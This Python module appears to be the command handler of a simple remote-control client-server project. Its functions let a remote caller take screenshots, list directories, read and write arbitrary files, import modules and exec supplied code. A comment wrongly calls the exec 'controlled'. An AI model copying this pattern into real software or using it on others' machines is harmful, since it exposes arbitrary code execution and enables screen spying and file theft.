import os
import PIL
from PIL import ImageGrab
import ast
import importlib


imported_modules = {
    "importlib": importlib,
    "ast": ast,
    "os": os,
    "PIL": PIL
}

clipboard_text = ""


def update_functions(code, function_name, command_name):
    local_scope = {}
    print("dropped it here-1")
    tree = ast.parse(code)
    print("dropped it here0")
    if len(tree.body) != 1:
        return "Code must contain exactly one top-level statement."
    if not isinstance(tree.body[0], ast.FunctionDef):
        return "Top-level statement must be a function definition."
    if tree.body[0].name != function_name:
        return f"Error: Function name in code ('{tree.body[0].name}') does not match the provided name ('{function_name}')."
    print("dropped it here1")
    compiled_code = compile(code, '<string>', 'exec')
    print("dropped it here2")
    exec(compiled_code, globals(), local_scope)  # Execute the code in a controlled scope
    if function_name in local_scope:
        function_dict[command_name] = local_scope[function_name]  # Add to function_dict
        return f"Function '{function_name}' added successfully."
    else:
        return "Error: Function name not found in provided code."


def import_module(module_name):
    if '.' in module_name:
        top_level_module = module_name.split('.')[0]
        if top_level_module not in imported_modules:
            return f"Error: Submodule imports are not allowed: {module_name}"
    if module_name in imported_modules:
        return f"Module '{module_name}' is already imported."
    try:
        module = importlib.import_module(module_name)
        imported_modules[module_name] = module
        return f"Module '{module_name}' imported successfully."
    except ImportError:
        return f"Error: Module '{module_name}' could not be imported."
    except Exception as e:
        return f"Unexpected error: {e}"


def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    screenshot.close()
    with open("screenshot.png", "rb") as screenshot_file:
        screenshot_data = screenshot_file.read()
    return screenshot_data


def upload_file(data, path):
    if os.path.exists(path):
        return "Error: Path already exist in this path.".encode()
    with open(path, "wb") as file:
        file.write(data)
        return f"File was uploaded to {path}".encode()


def download_file(path):
    if not os.path.exists(path):
        return "Error: Path does not exist".encode()
    with open(path, "rb") as file:
        file_data = file.read()
        return b"File data was successfully downloaded. File data : " + file_data


def show_dir_content(dir_path):
    if not os.path.exists(dir_path):
        return "Error: Path does not exist".encode()
    files = [f for f in os.listdir(path=dir_path)]
    file_str = "directory content:" + " ,".join(files)
    return file_str.encode()


def get_welcome_message():
    with open("welcome_message.json", "rb") as file:
        file_data = file.read()
        return file_data


def paste_to_clipboard(content):
    global clipboard_text
    clipboard_text = content
    return "Content was Pasted.".encode()


def copy_clipboard():
    return clipboard_text.encode()


function_dict = {
    "SHOW_DIR_CONTENT": show_dir_content,
    "GET_WELCOME_MESSAGE": get_welcome_message,
    "TAKE_SCREENSHOT": take_screenshot,
    "UPLOAD_FILE": upload_file,
    "DOWNLOAD_FILE": download_file,
    "IMPORT_MODULE": import_module,
    "PASTE_TO_CLIPBOARD": paste_to_clipboard,
    "COPY_CLIPBOARD": copy_clipboard
}
